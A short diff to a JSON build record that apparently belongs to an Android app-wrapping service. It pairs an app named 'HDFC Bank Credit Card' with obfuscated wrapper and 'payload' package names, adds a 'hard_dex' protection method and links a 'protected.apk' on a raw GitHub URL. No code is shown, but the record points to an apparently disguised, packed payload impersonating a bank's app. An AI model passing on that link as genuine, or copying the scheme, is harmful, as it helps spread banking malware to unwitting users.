@@ -2,10 +2,11 @@
   "user_id": 7771105502,
   "slot": 4,
   "app_name": "HDFC Bank Credit Card",
-  "wrap_package": "zbo.pv5pyo.r4xf.kif9y",
+  "wrap_package": "zo2.doqjhp.g1we.u639x",
   "payload_package": "vlh.lmtgxm.spp4.ltpk8",
   "wrap_bin": "vlh.lmtgxm.spp4.ltpk8.bin",
+  "protect_method": "hard_dex",
   "cdn_url": "https://raw.githubusercontent.com/mohanqquiku/Private-Database/main/users/7771105502/app4/output/protected.apk",
-  "size": 1182691,
-  "updated_at": "2026-11-28T13:43:25.940Z"
+  "size": 3068977,
+  "updated_at": "2026-11-28T13:49:20.183Z"
 }
